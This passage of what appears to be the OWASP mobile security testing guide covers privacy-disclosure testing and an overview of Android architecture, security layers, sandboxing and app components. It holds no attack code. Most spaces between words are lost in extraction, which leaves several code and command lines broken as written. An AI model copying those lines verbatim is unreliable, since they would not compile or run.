Anappdisplayssensitivedatasuchascreditcarddetailsoruserpasswordswithoutuserauthorization e.g.biometrics(violatingMSTG-AUTH-10). • Example3: Anappthataccessesauser’sphoneorcontactbookdataanddoesn’ttreatthisdataaspersonalor sensitivedata,additionallysendingitoveranunsecurednetworkconnection(violatingMSTG-NETWORK-1). • Example4: Anappcollectsdevicelocation(whichisapparentlynotrequiredforitsproperfunctioning)anddoes nothaveaprominentdisclosureexplainingwhichfeatureusesthisdata(violatingMSTG-PLATFORM-1). YoucanfindmorecommonviolationsinGooglePlayConsoleHelpbygoingtoPolicyCentre->Privacy,deception anddeviceabuse->Userdata. 86\nAsyoucanseethisisdeeplyrelatedtoothertestingcategories. Whenyou’retestingthemyou’reoftenindirectlytesting forUserPrivacyProtection. Keepthisinmindsinceitwillhelpyouprovidebetterandmorecomprehensivereports. Often you’llalsobeabletoreuseevidencefromothertestsinordertotestforUserPrivacyProtection). Testing User Education on Data Privacy on the App Marketplace Atthispoint,we’reonlyinterestedinknowingwhichprivacy-relatedinformationisbeingdisclosedbythedevelopersand tryingtoevaluateifitseemsreasonable(similarlyasyou’ddowhentestingforpermissions). It’spossiblethatthedevelopersarenotdeclaringcertaininformationthatisindeedbeingcollectedand/orshared, butthat’satopicforadifferenttestextendingthisonehere. Aspartofthistest,youarenotsupposedtoprovide privacyviolationassurance. Static Analysis Youcanfollowthesesteps: 1. Searchfortheappinthecorrespondingappmarketplace(e.g.GooglePlay,AppStore). 2. Gotothesection“PrivacyDetails”(AppStore)or“SafetySection”(GooglePlay). 3. Verifyifthere’sanyinformationavailableatall. Thetestpassesifthedeveloperhascompliedwiththeappmarketplaceguidelinesandincludedtherequiredlabelsand explanations. Storeandprovidetheinformationyougotfromtheappmarketplaceasevidence,sothatyoucanlateruse ittoevaluatepotentialviolationsofprivacyordataprotection. Dynamic analysis Asanoptionalstep,youcanalsoprovidesomekindofevidenceaspartofthistest. Forinstance,ifyou’retestinganiOS appyoucaneasilyenableappactivityrecordingandexportaPrivacyReportcontainingdetailedappaccesstodifferent resourcessuchasphotos,contacts,camera,microphone,networkconnections,etc. Doing this has actually many advantages for testing other MASVS categories. It provides very useful information that youcanusetotestnetworkcommunicationforMASVS-NETWORKorwhentestingappinteractionwiththeplatformfor MASVS-PLATFORM.Whiletestingtheseothercategoriesyoumighthavetakensimilarmeasurementsusingothertesting tools. Youcanalsoprovidethisasevidenceforthistest. Ideally, the information available should be compared against what the app is actually meant to do. However, that’sfarfromatrivialtaskthatcouldtakefromseveraldaystoweekstocompletedependingonyourresources andsupportfromautomatedtooling. Italsoheavilydependsontheappfunctionalityandcontextandshouldbe ideallyperformedonawhiteboxsetupworkingverycloselywiththeappdevelopers. Testing User Education on Security Best Practices Testingthismightbeespeciallychallengingifyouintendtoautomateit. Werecommendusingtheappextensivelyand trytoanswerthefollowingquestionswheneverapplicable: • Fingerprint usage: when fingerprints are used for authentication providing access to high-risk transac- tions/information, doestheappinformtheuseraboutpotentialissueswhenhavingmultiplefingerprintsofotherpeopleregistered tothedeviceaswell? • Rooting/Jailbreaking: whenrootorjailbreakdetectionisimplemented, does the app inform the user of the fact that certain high-risk actions will carry additional risk due to the jailbro- ken/rootedstatusofthedevice? 87\n• Specificcredentials: whenausergetsarecoverycode,apasswordorapinfromtheapplication(orsetsone), doestheappinstructtheusertoneversharethiswithanyoneelseandthatonlytheappwillrequestit? • Applicationdistribution: incaseofahigh-riskapplicationandinordertopreventusersfromdownloadingcom- promisedversionsoftheapplication, doestheappmanufacturerproperlycommunicatetheofficialwayofdistributingtheapp(e.g.fromGooglePlayor theAppStore)? • ProminentDisclosure: inanycase, doestheappdisplayprominentdisclosureofdataaccess,collection,use,andsharing? e.g.doestheappusethe AppTrackingTransparencyFrameworktoaskforthepermissiononiOS? Somereferencesinclude: • Open-SourceLicensesandAndroid-https://www.bignerdranch.com/blog/open-source-licenses-and-android/ • SoftwareLicensesinPlainEnglish-https://tldrlegal.com/ • AppleAccessingprivatedata-https://developer.apple.com/design/human-interface-guidelines/privacy • AndroidApppermissionsbestpractices-https://developer.android.com/training/permissions/requesting.html#exp lain 88\nAndroid Platform Overview This chapter introduces the Android platform from an architecture point of view. The following five key areas are dis- cussed: 1. Androidarchitecture 2. Androidsecurity: defense-in-depthapproach 3. Androidapplicationstructure 4. Androidapplicationpublishing 5. Androidapplicationattacksurface VisittheofficialAndroiddeveloperdocumentationwebsiteformoredetailsabouttheAndroidplatform. Android Architecture AndroidisaLinux-basedopensourceplatformdevelopedbytheOpenHandsetAlliance(aconsortiumleadbyGoogle), which serves as a mobile operating system (OS). Today the platform is the foundation for a wide variety of modern technology, such as mobile phones, tablets, wearable tech, TVs, and other smart devices. Typical Android builds ship witharangeofpre-installed(“stock”)appsandsupportinstallationofthird-partyappsthroughtheGooglePlaystoreand othermarketplaces. Android’s software stack is composed of several different layers. Each layer defines interfaces and offers specific ser- vices. 89\nKernel: At the lowest level, Android is based on a variation of the Linux Kernel containing some significant additions, including Low Memory Killer, wake locks, the Binder IPC driver, etc. For the purpose of the MASTG, we’ll focus on the user-modepartoftheOS,whereAndroidsignificantlydiffersfromatypicalLinuxdistribution. Thetwomostimportant componentsforusarethemanagedruntimeusedbyapplications(ART/Dalvik)andBionic,Android’sversionofglibc,the GNUClibrary. HAL:Ontopofthekernel,theHardwareAbstractionLayer(HAL)definesastandardinterfaceforinteractingwithbuilt-in hardwarecomponents. SeveralHALimplementationsarepackagedintosharedlibrarymodulesthattheAndroidsystem calls when required. This is the basis for allowing applications to interact with the device’s hardware. For example, it allowsastockphoneapplicationtouseadevice’smicrophoneandspeaker. Runtime Environment: Android apps are written in Java and Kotlin and then compiled to Dalvik bytecode which can bethenexecutedusingaruntimethatinterpretsthebytecodeinstructionsandexecutesthemonthetargetdevice. For Android, thisistheAndroidRuntime(ART).ThisissimilartotheJVM(JavaVirtualMachine)forJavaapplications, orthe MonoRuntimefor.NETapplications. DalvikbytecodeisanoptimizedversionofJavabytecode. ItiscreatedbyfirstcompilingtheJavaorKotlincodetoJava bytecode,usingthejavacandkotlinccompilersrespectively,producing.classfiles. Finally,theJavabytecodeisconverted toDalvikbytecodeusingthed8tool. DalvikbytecodeispackedwithinAPKandAABfilesintheformof.dexfilesandis usedbyamanagedruntimeonAndroidtoexecuteitonthedevice. 90\nBeforeAndroid5.0(APIlevel21),AndroidexecutedbytecodeontheDalvikVirtualMachine(DVM),whereitwastranslated intomachinecodeatexecutiontime,aprocessknownasjust-in-time(JIT)compilation. Thisenablestheruntimetobenefit fromthespeedofcompiledcodewhilemaintainingtheflexibilityofcodeinterpretation. SinceAndroid5.0(APIlevel21),AndroidexecutesbytecodeontheAndroidRuntime(ART)whichisthesuccessorofthe DVM.ARTprovidesimprovedperformanceaswellascontextinformationinappnativecrashreports,byincludingboth Javaandnativestackinformation. ItusesthesameDalvikbytecodeinputtomaintainbackwardcompatibility. However, ART executes the Dalvik bytecode differently, using a hybrid combination of ahead-of-time (AOT), just-in-time (JIT) and profile-guidedcompilation. • AOTpre-compilesDalvikbytecodeintonativecode,andthegeneratedcodewillbesavedondiskwiththe.oatexten- sion(ELFbinary). Thedex2oattoolcanbeusedtoperformthecompilationandcanbefoundat/system/bin/dex2oat onAndroiddevices. AOTcompilationisexecutedduringtheinstallationoftheapp. Thismakestheapplicationstart faster,asnocompilationisneededanymore. However,thisalsomeansthattheinstalltimeincreasesascompared toJITcompilation. Additionally,sinceapplicationsarealwaysoptimizedagainstthecurrentversionoftheOS,this meansthatsoftwareupdateswillrecompileallpreviouslycompiledapplications,resultinginasignificantincrease in the system update time. Finally, AOT compilation will compile the entire application, even if certain parts are neverusedbytheuser. • JIThappensatruntime. • Profile-guided compilationisahybridapproachthatwasintroducedinAndroid7(APIlevel24)tocombatthe downsidesofAOT.Atfirst, theapplicationwilluseJITcompilation, andAndroidkeepstrackofallthepartsofthe applicationthatarefrequentlyused. Thisinformationisstoredinanapplicationprofileandwhenthedeviceisidle, acompilation(dex2oat)daemonrunswhichAOTcompilestheidentifiedfrequentcodepathsfromtheprofile. 91\nSource: https://lief-project.github.io/doc/latest/tutorials/10_android_formats.html Sandboxing: Androidappsdon’thavedirectaccesstohardwareresources,andeachapprunsinitsownvirtualmachine orsandbox. ThisenablestheOStohaveprecisecontroloverresourcesandmemoryaccessonthedevice. Forinstance, acrashingappdoesn’taffectotherappsrunningonthesamedevice. Androidcontrolsthemaximumnumberofsystem resources allocated to apps, preventing any one app from monopolizing too many resources. At the same time, this sandboxdesigncanbeconsideredasoneofthemanyprinciplesinAndroid’sglobaldefense-in-depthstrategy. Amalicious third-partyapplication,withlowprivileges,shouldn’tbeabletoescapeitsownruntimeandreadthememoryofavictim applicationonthesamedevice. InthefollowingsectionwetakeacloserlookatthedifferentdefenselayersintheAndroid operatingsystem. Learnmoreinthesection“SoftwareIsolation”. YoucanfindmoredetailedinformationintheGoogleSourcearticle“AndroidRuntime(ART)”,thebook“AndroidInternals” byJonathanLevinandtheblogpost“Android101”by@_qaz_qaz. Android Security: Defense-in-Depth Approach TheAndroidarchitectureimplementsdifferentsecuritylayersthat, together, enableadefense-in-depthapproach. This meansthattheconfidentiality,integrityoravailabilityofsensitiveuser-dataorapplicationsdoesn’thingeononesingle security measure. This section brings an overview of the different layers of defense that the Android system provides. Thesecuritystrategycanberoughlycategorizedintofourdistinctdomains,eachfocusingonprotectingagainstcertain attackmodels. • System-widesecurity • Softwareisolation • Networksecurity • Anti-exploitation System-wide security Device encryption AndroidsupportsdeviceencryptionfromAndroid2.3.4(APIlevel10)andithasundergonesomebigchangessincethen. GoogleimposedthatalldevicesrunningAndroid6.0(APIlevel23)orhigherhadtosupportstorageencryption,although somelow-enddeviceswereexemptbecauseitwouldsignificantlyimpacttheirperformance. • Full-DiskEncryption(FDE):Android5.0(APIlevel21)andabovesupportfull-diskencryption. Thisencryptionuses asinglekeyprotectedbytheuser’sdevicepasswordtoencryptanddecrypttheuserdatapartition. Thiskindof encryption is now considered deprecated and file-based encryption should be used whenever possible. Full-disk encryptionhasdrawbacks,suchasnotbeingabletoreceivecallsornothavingoperativealarmsafterarebootif theuserdoesnotenterthepasswordtounlock. 92\n• File-BasedEncryption(FBE):Android7.0(APIlevel24)supportsfile-basedencryption. File-basedencryptionallows differentfilestobeencryptedwithdifferentkeyssotheycanbedecipheredindependently. Devicesthatsupport thistypeofencryptionsupportDirectBootaswell. DirectBootenablesthedevicetohaveaccesstofeaturessuch asalarmsoraccessibilityserviceseveniftheuserdidn’tunlockthedevice. Note: youmighthearofAdiantum,whichisanencryptionmethoddesignedfordevicesrunningAndroid9(APIlevel 28)andhigherwhoseCPUslackAESinstructions. Adiantum is only relevant for ROM developers or device vendors,AndroiddoesnotprovideanAPIfordeveloperstouseAdiantumfromapplications. Asrecommendedby Google,AdiantumshouldnotbeusedwhenshippingARM-baseddeviceswithARMv8CryptographyExtensionsor x86-baseddeviceswithAES-NI.AESisfasteronthoseplatforms. FurtherinformationisavailableintheAndroiddocumentation. Trusted Execution Environment (TEE) InorderfortheAndroidsystemtoperformencryptionitneedsawaytosecurelygenerate,importandstorecryptographic keys. Weareessentiallyshiftingtheproblemofkeepingsensitivedatasecuretowardskeepingacryptographickeysecure. Iftheattackercandumporguessthecryptographickey,thesensitiveencrypteddatacanberetrieved. Androidoffersatrustedexecutionenvironmentindedicatedhardwaretosolvetheproblemofsecurelygeneratingand protectingcryptographickeys. ThismeansthatadedicatedhardwarecomponentintheAndroidsystemisresponsible forhandlingcryptographickeymaterial. Threemainmodulesareresponsibleforthis: • Hardware-backed KeyStore: This module offers cryptographic services to the Android OS and third-party apps. It enables apps to perform cryptographic sensitive operations in an TEE without exposing the cryptographic key material. • StrongBox: InAndroid9(Pie),StrongBoxwasintroduced,anotherapproachtoimplementahardware-backedKey- Store. While previous to Android 9 Pie, a hardware-backed KeyStore would be any TEE implementation that lies outside of the Android OS kernel. StrongBox is an actual complete separate hardware chip that is added to the deviceonwhichtheKeyStoreisimplementedandisclearlydefinedintheAndroiddocumentation. Youcancheck programmaticallywhetherakeyresidesinStrongBoxandifitdoes,youcanbesurethatitisprotectedbyahard- waresecuritymodulethathasitsownCPU,securestorage, andTrueRandomNumberGenerator(TRNG).Allthe sensitivecryptographicoperationshappenonthischip,inthesecureboundariesofStrongBox. • GateKeeper: TheGateKeepermoduleenablesdevicepatternandpasswordauthentication. Thesecuritysensitive operations during the authentication process happen inside the TEE that is available on the device. GateKeeper consistsofthreemaincomponents,(1)gatekeeperdwhichistheservicethatexposesGateKeeper,(2)GateKeeper HAL,whichisthehardwareinterfaceand(3)theTEEimplementationwhichistheactualsoftwarethatimplements theGateKeeperfunctionalityintheTEE. Verified Boot WeneedtohaveawaytoensurethatcodethatisbeingexecutedonAndroiddevicescomesfromatrustedsourceand thatitsintegrityisnotcompromised. Inordertoachievethis,Androidintroducedtheconceptofverifiedboot. Thegoalof verifiedbootistoestablishatrustrelationshipbetweenthehardwareandtheactualcodethatexecutesonthishardware. Duringtheverifiedbootsequence,afullchainoftrustisestablishedstartingfromthehardware-protectedRoot-of-Trust (RoT) up until the final system that is running, passing through and verifying all the required boot phases. When the Androidsystemisfinallybootedyoucanrestassuredthatthesystemisnottamperedwith. Youhavecryptographicproof thatthecodewhichisrunningistheonethatisintendedbytheOEMandnotonethathasbeenmaliciouslyoraccidentally altered. FurtherinformationisavailableintheAndroiddocumentation. Software Isolation Android Users and Groups EventhoughtheAndroidoperatingsystemisbasedonLinux,itdoesn’timplementuseraccountsinthesamewayother Unix-likesystemsdo. InAndroid,themulti-usersupportoftheLinuxkernelisusedtosandboxapps: withafewexceptions, 93\neachapprunsasthoughunderaseparateLinuxuser,effectivelyisolatedfromotherappsandtherestoftheoperating system. Thefilesystem/core/include/private/android_filesystem_config.hincludesalistofthepredefinedusersandgroupssystem processesareassignedto. UIDs(userIDs)forotherapplicationsareaddedasthelatterareinstalled. Formoredetails, checkouttheblogpost“AnOverviewOfApplicationSandbox”byBinChenonAndroidsandboxing. Forexample,Android9.0(APIlevel28)definesthefollowingsystemusers: #defineAID_ROOT 0 /*traditionalunixrootuser*/ #... #defineAID_SYSTEM 1000 /*systemserver*/ #... #defineAID_SHELL 2000 /*adbanddebugshelluser*/ #... #defineAID_APP_START 10000 /*firstappuser*/ ... SELinux Security-EnhancedLinux(SELinux)usesaMandatoryAccessControl(MAC)systemtofurtherlockdownwhichprocesses shouldhaveaccesstowhichresources. Eachresourceisgivenalabelintheformofuser:role:type:mls_levelwhich defineswhichusersareabletoexecutewhichtypesofactionsonit. Forexample,oneprocessmayonlybeabletoread a file, while another process may be able to edit or delete the file. This way, by working on a least-privilege principle, vulnerableprocessesaremoredifficulttoexploitviaprivilegeescalationorlateralmovement. FurtherinformationisavailableontheAndroiddocumentation. Permissions Androidimplementsanextensivepermissionssystemthatisusedasanaccesscontrolmechanism. Itensurescontrolled accesstosensitiveuserdataanddeviceresources. Androidcategorizespermissionsintodifferenttypesofferingvarious protectionlevels. Prior to Android 6.0 (API level 23), all permissions an app requested were granted at installation (Install-time per- missions). FromAPIlevel23onwards,theusermustapprovesomepermissionsrequestsduringruntime(Runtime permissions). FurtherinformationisavailableintheAndroiddocumentationincludingseveralconsiderationsandbestpractices. TolearnhowtotestapppermissionsrefertotheTestingAppPermissionssectioninthe“AndroidPlatformAPIs”chapter. Network security TLS by Default Bydefault,sinceAndroid9(APIlevel28),allnetworkactivityistreatedasbeingexecutedinahostileenvironment. This means that the Android system will only allow apps to communicate over a network channel that is established using the Transport Layer Security (TLS) protocol. This protocol effectively encrypts all network traffic and creates a secure channeltoaserver. Itmaybethecasethatyouwouldwanttousecleartrafficconnectionsforlegacyreasons. Thiscan beachievedbyadaptingtheres/xml/network_security_config.xmlfileintheapplication. FurtherinformationisavailableintheAndroiddocumentation. DNS over TLS System-wideDNSoverTLSsupporthasbeenintroducedsinceAndroid9(APIlevel28). Itallowsyoutoperformqueries toDNSserversusingtheTLSprotocol. AsecurechannelisestablishedwiththeDNSserverthroughwhichtheDNSquery issent. ThisassuresthatnosensitivedataisexposedduringaDNSlookup. FurtherinformationisavailableontheAndroidDevelopersblog. 94\nAnti-exploitation ASLR, KASLR, PIE and DEP AddressSpaceLayoutRandomization(ASLR),whichhasbeenpartofAndroidsinceAndroid4.1(APIlevel15),isastandard protectionagainstbuffer-overflowattacks,whichmakessurethatboththeapplicationandtheOSareloadedtorandom memoryaddressesmakingitdifficulttogetthecorrectaddressforaspecificmemoryregionorlibrary. InAndroid8.0(API level26),thisprotectionwasalsoimplementedforthekernel(KASLR).ASLRprotectionisonlypossibleiftheapplication canbeloadedatarandomplaceinmemory,whichisindicatedbythePositionIndependentExecutable(PIE)flagofthe application. Since Android 5.0 (API level 21), support for non-PIE enabled native libraries was dropped. Finally, Data ExecutionPrevention(DEP)preventscodeexecutiononthestackandheap,whichisalsousedtocombatbuffer-overflow exploits. FurtherinformationisavailableontheAndroidDevelopersblog. SECCOMP Filter AndroidapplicationscancontainnativecodewritteninCorC++. Thesecompiledbinariescancommunicatebothwith the Android Runtime through Java Native Interface (JNI) bindings, and with the OS through system calls. Some system calls are either not implemented, or are not supposed to be called by normal applications. As these system calls com- municatedirectlywiththekernel,theyareaprimetargetforexploitdevelopers. WithAndroid8(APIlevel26),Android hasintroducedthesupportforSecureComputing(SECCOMP)filtersforallZygotebasedprocesses(i.e.userapplications). Thesefiltersrestricttheavailablesyscallstothoseexposedthroughbionic. FurtherinformationisavailableontheAndroidDevelopersblog. Android Application Structure Communication with the Operating System Android apps interact with system services via the Android Framework, an abstraction layer that offers high-level Java APIs. ThemajorityoftheseservicesareinvokedvianormalJavamethodcallsandaretranslatedtoIPCcallstosystem servicesthatarerunninginthebackground. Examplesofsystemservicesinclude: • Connectivity(Wi-Fi,Bluetooth,NFC,etc.) • Files • Cameras • Geolocation(GPS) • Microphone Theframeworkalsoofferscommonsecurityfunctions,suchascryptography. TheAPIspecificationschangewitheverynewAndroidrelease. Criticalbugfixesandsecuritypatchesareusuallyapplied toearlierversionsaswell. NoteworthyAPIversions: • Android4.2(APIlevel16)inNovember2012(introductionofSELinux) • Android4.3(APIlevel18)inJuly2013(SELinuxbecameenabledbydefault) • Android4.4(APIlevel19)inOctober2013(severalnewAPIsandARTintroduced) • Android5.0(APIlevel21)inNovember2014(ARTusedbydefaultandmanyotherfeaturesadded) • Android 6.0 (API level 23) in October 2015 (many new features and improvements, including granting; detailed permissionssetupatruntimeratherthanallornothingduringinstallation) • Android7.0(APIlevel24-25)inAugust2016(newJITcompileronART) • Android8.0(APIlevel26-27)inAugust2017(alotofsecurityimprovements) • Android9(APIlevel28)inAugust2018(restrictionofbackgroundusageofmicorcamera,introductionoflockdown mode,defaultHTTPSforallapps) • Android 10 (API level 29)inSeptember2019(accesslocation“onlywhileusingtheapp”, devicetrackingpre- vention,improvesecureexternalstorage,) – Privacy(overview) 95\n– Privacy(details1) – Privacy(details2) – Security(overview) – Security(details) • Android 11 (API level 30) in September 2020 (scoped storage enforcement, Permissions auto-reset, reduced packagevisibility,APKSignatureSchemev4) – Privacy(overview) – PrivacyBehaviorchanges(allapps) – SecurityBehaviorchanges(allapps) – PrivacyBehaviorchanges(appstargetingversion) – SecurityBehaviorchanges(appstargetingversion) • Android12(APIlevel31-32)inAugust2021(MaterialYou,Webintentresolution,PrivacyDashboard) – Securityandprivacy – Behaviorchanges(allapps) – Behaviorchanges(appstargetingversion) • Android13(APIlevel33)in2022(Saferexportingofcontext-registeredreceivers,newphotopicker) – Securityandprivacy – PrivacyBehaviorchanges(allapps) – SecurityBehaviorchanges(allapps) – PrivacyBehaviorchanges(appstargetingversion) – SecurityBehaviorchanges(appstargetingversion) • Android14(APIlevel34)in2023: – Summaryofchanges – SecurityBehaviorchanges(allapps) – SecurityBehaviorchanges(appstargetingversion) Androiddevelopmentreleasesfollowauniquestructure. Theyareorganizedintofamiliesandgivenalphabeticalcode- namesinspiredbytastytreats. Youcanfindthemallhere. The App Sandbox AppsareexecutedintheAndroidApplicationSandbox,whichseparatestheappdataandcodeexecutionfromotherapps onthedevice. Asmentionedbefore,thisseparationaddsafirstlayerofdefense. Installationofanewappcreatesanewdirectorynamedaftertheapppackage,whichresultsinthefollowingpath: /data/ data/[package-name]. Thisdirectoryholdstheapp’sdata. Linuxdirectorypermissionsaresetsuchthatthedirectory canbereadfromandwrittentoonlywiththeapp’suniqueUID. We can confirm this by looking at the file system permissions in the /data/data folder. For example, we can see that GoogleChromeandCalendarareassignedonedirectoryeachandrununderdifferentuseraccounts: 96\ndrwx------ 4u0_a97 u0_a97 40962017-01-1814:27com.android.calendar drwx------ 6u0_a120 u0_a120 40962017-01-1912:54com.android.chrome Developerswhowanttheirappstoshareacommonsandboxcansidestepsandboxing. Whentwoappsaresignedwith the same certificate and explicitly share the same user ID (having the sharedUserId in their AndroidManifest.xml files), eachcanaccesstheother’sdatadirectory. SeethefollowingexampletoachievethisintheNFCapp: <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.nfc" android:sharedUserId="android.uid.nfc"> Linux User Management AndroidleveragesLinuxusermanagementtoisolateapps. Thisapproachisdifferentfromusermanagementusagein traditional Linux environments, where multiple apps are often run by the same user. Android creates a unique UID for each Android app and runs the app in a separate process. Consequently, each app can access its own resources only. ThisprotectionisenforcedbytheLinuxkernel. Generally,appsareassignedUIDsintherangeof10000and99999. Androidappsreceiveausernamebasedontheir UID. For example, the app with UID 10188 receives the user name u0_a188. If the permissions an app requested are granted,thecorrespondinggroupIDisaddedtotheapp’sprocess. Forexample,theuserIDoftheappbelowis10188. ItbelongstothegroupID3003(inet). Thatgroupisrelatedtoandroid.permission.INTERNETpermission. Theoutputof theidcommandisshownbelow. $id uid=10188(u0_a188)gid=10188(u0_a188)groups=10188(u0_a188),3003(inet), 9997(everybody),50188(all_a188)context=u:r:untrusted_app:s0:c512,c768 TherelationshipbetweengroupIDsandpermissionsisdefinedinthefollowingfile: frameworks/base/data/etc/platform.xml <permission name="android.permission.INTERNET" > <group gid="inet" /> </permission> <permission name="android.permission.READ_LOGS" > <group gid="log" /> </permission> <permission name="android.permission.WRITE_MEDIA_STORAGE" > <group gid="media_rw" /> <group gid="sdcard_rw" /> </permission> Zygote The process Zygote starts up during Android initialization. Zygote is a system service for launching apps. The Zygote process is a “base” process that contains all the core libraries the app needs. Upon launch, Zygote opens the socket /dev/socket/zygoteandlistensforconnectionsfromlocalclients. Whenitreceivesaconnection,itforksanewprocess, whichthenloadsandexecutestheapp-specificcode. App Lifecycle In Android, the lifetime of an app process is controlled by the operating system. A new Linux process is created when anappcomponentisstartedandthesameappdoesn’tyethaveanyothercomponentsrunning. Androidmaykillthis processwhenthelatterisnolongernecessaryorwhenreclaimingmemoryisnecessarytorunmoreimportantapps. The decisiontokillaprocessisprimarilyrelatedtothestateoftheuser’sinteractionwiththeprocess. Ingeneral,processes canbeinoneoffourstates. • Aforegroundprocess(e.g.,anactivityrunningatthetopofthescreenorarunningBroadcastReceiver) • Avisibleprocessisaprocessthattheuserisawareof,sokillingitwouldhaveanoticeablenegativeimpactonuser experience. Oneexampleisrunninganactivitythat’svisibletotheuseron-screenbutnotintheforeground. 97\n• AserviceprocessisaprocesshostingaservicethathasbeenstartedwiththestartServicemethod. Thoughthese processesaren’tdirectlyvisibletotheuser,theyaregenerallythingsthattheusercaresabout(suchasbackground networkdatauploadordownload),sothesystemwillalwayskeepsuchprocessesrunningunlessthere’sinsufficient memorytoretainallforegroundandvisibleprocesses. • Acachedprocessisaprocessthat’snotcurrentlyneeded,sothesystemisfreetokillitwhenmemoryisneeded. Apps must implement callback methods that react to a number of events; for example, the onCreate handler is called when the app process is first created. Other callback methods include onLowMemory, onTrimMemory and onConfigurationChanged. App Bundles Android applications can be shipped in two forms: the Android Package Kit (APK) file or an Android App Bundle (.aab). AndroidAppBundlesprovidealltheresourcesnecessaryforanapp,butdeferthegenerationoftheAPKanditssigning toGooglePlay. AppBundlesaresignedbinarieswhichcontainthecodeoftheappinseveralmodules. Thebasemodule containsthecoreoftheapplication. Thebasemodulecanbeextendedwithvariousmoduleswhichcontainnewenrich- ments/functionalities for the app as further explained on the developer documentation for app bundle. If you have an AndroidAppBundle,youcanbestusethebundletoolcommandlinetoolfromGoogletobuildunsignedAPKsinorderto usetheexistingtoolingontheAPK.YoucancreateanAPKfromanAABfilebyrunningthefollowingcommand: bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks IfyouwanttocreatesignedAPKsreadyfordeploymenttoatestdevice,use: $bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks --ks=/MyApp/keystore.jks --ks-pass=file:/MyApp/keystore.pwd --ks-key-alias=MyKeyAlias --key-pass=file:/MyApp/key.pwd WerecommendthatyoutestboththeAPKwithandwithouttheadditionalmodules,sothatitbecomesclearwhetherthe additionalmodulesintroduceand/orfixsecurityissuesforthebasemodule. Android Manifest Every app has an Android Manifest file, which embeds content in binary XML format. The standard name of this file is AndroidManifest.xml. Itislocatedintherootdirectoryoftheapp’sAndroidPackageKit(APK)file. Themanifestfiledescribestheappstructure,itscomponents(activities,services,contentproviders,andintentreceivers), andrequestedpermissions. Italsocontainsgeneralappmetadata,suchastheapp’sicon,versionnumber,andtheme. Thefilemaylistotherinformation,suchascompatibleAPIs(minimal,targeted,andmaximalSDKversion)andthekind ofstorageitcanbeinstalledon(externalorinternal). Here is an example of a manifest file, including the package name (the convention is a reversed URL, but any string isacceptable). Italsoliststheappversion, relevantSDKs, requiredpermissions, exposedcontentproviders, broadcast receiversusedwithintentfiltersandadescriptionoftheappanditsactivities: <manifest package="com.owasp.myapplication" android:versionCode="0.1" > <uses-sdk android:minSdkVersion="12" android:targetSdkVersion="22" android:maxSdkVersion="25" /> <uses-permission android:name="android.permission.INTERNET" /> <provider android:name="com.owasp.myapplication.MyProvider" android:exported="false" /> <receiver android:name=".MyReceiver" > <intent-filter> <action android:name="com.owasp.myapplication.myaction" /> </intent-filter> 98\n</receiver> <application android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/Theme.Material.Light" > <activity android:name="com.owasp.myapplication.MainActivity" > <intent-filter> <action android:name="android.intent.action.MAIN" /> </intent-filter> </activity> </application> </manifest> ThefulllistofavailablemanifestoptionsisintheofficialAndroidManifestfiledocumentation. App Components Androidappsaremadeofseveralhigh-levelcomponents. Themaincomponentsare: • Activities • Fragments • Intents • Broadcastreceivers • Contentprovidersandservices All these elements are provided by the Android operating system, in the form of predefined classes available through APIs. Activities Activities make up the visible part of any app. There is one activity per screen, so an app with three different screens implementsthreedifferentactivities. ActivitiesaredeclaredbyextendingtheActivityclass. Theycontainalluserinterface elements: fragments,views,andlayouts. EachactivityneedstobedeclaredintheAndroidManifestwiththefollowingsyntax: <activity android:name="ActivityName"> </activity> Activitiesnotdeclaredinthemanifestcan’tbedisplayed,andattemptingtolaunchthemwillraiseanexception. Likeapps,activitieshavetheirownlifecycleandneedtomonitorsystemchangestohandlethem. Activitiescanbein thefollowingstates: active,paused,stopped,andinactive. ThesestatesaremanagedbytheAndroidoperatingsystem. Accordingly,activitiescanimplementthefollowingeventmanagers: • onCreate • onSaveInstanceState • onStart • onResume • onRestoreInstanceState • onPause • onStop • onRestart • onDestroy Anappmaynotexplicitlyimplementalleventmanagers,inwhichcasedefaultactionsaretaken. Typically,atleastthe onCreatemanagerisoverriddenbytheappdevelopers. Thisishowmostuserinterfacecomponentsaredeclaredand initialized. onDestroymaybeoverriddenwhenresources(likenetworkconnectionsorconnectionstodatabases)must beexplicitlyreleasedorspecificactionsmustoccurwhentheappshutsdown. 99\nFragments Afragmentrepresentsabehaviororaportionoftheuserinterfacewithintheactivity. FragmentswereintroducedAndroid withtheversionHoneycomb3.0(APIlevel11). Fragments are meant to encapsulate parts of the interface to facilitate re-usability and adaptation to different screen sizes. Fragmentsareautonomousentitiesinthattheyincludealltheirrequiredcomponents(theyhavetheirownlayout, buttons,etc.). However,theymustbeintegratedwithactivitiestobeuseful: fragmentscan’texistontheirown. They havetheirownlifecycle,whichistiedtothelifecycleoftheActivitiesthatimplementthem. Because fragments have their own life cycle, the Fragment class contains event managers that can be redefined and extended. TheseeventmanagersincludedonAttach,onCreate,onStart,onDestroyandonDetach. Severalothersexist; thereadershouldrefertotheAndroidFragmentspecificationformoredetails. FragmentscanbeeasilyimplementedbyextendingtheFragmentclassprovidedbyAndroid: ExampleinJava: public class MyFragment extends Fragment { ... } ExampleinKotlin: class MyFragment :Fragment(){ ... } Fragmentsdon’tneedtobedeclaredinmanifestfilesbecausetheydependonactivities. Tomanageitsfragments,anactivitycanuseaFragmentManager(FragmentManagerclass). Thisclassmakesiteasyto find,add,remove,andreplaceassociatedfragments. FragmentManagerscanbecreatedviathefollowing: ExampleinJava: FragmentManagerfm =getFragmentManager(); ExampleinKotlin: varfm=fragmentManager Fragments don’t necessarily have a user interface; they can be a convenient and efficient way to manage background operationspertainingtotheapp’suserinterface. Afragmentmaybedeclaredpersistentsothatifthesystempreserves itsstateevenifitsActivityisdestroyed. Content Providers Android uses SQLite to store data permanently: as with Linux, data is stored in files. SQLite is a light, efficient, open sourcerelationaldatastoragetechnologythatdoesnotrequiremuchprocessingpower,whichmakesitidealformobile use. An entire API with specific classes (Cursor, ContentValues, SQLiteOpenHelper, ContentProvider, ContentResolver, etc.) is available. SQLite is not run as a separate process; it is part of the app. By default, a database belonging to a givenappisaccessibletothisapponly. However,contentprovidersofferagreatmechanismforabstractingdatasources (includingdatabasesandflatfiles); theyalsoprovideastandardandefficientmechanismtosharedatabetweenapps, includingnativeapps. Tobeaccessibletootherapps,acontentproviderneedstobeexplicitlydeclaredinthemanifest file of the app 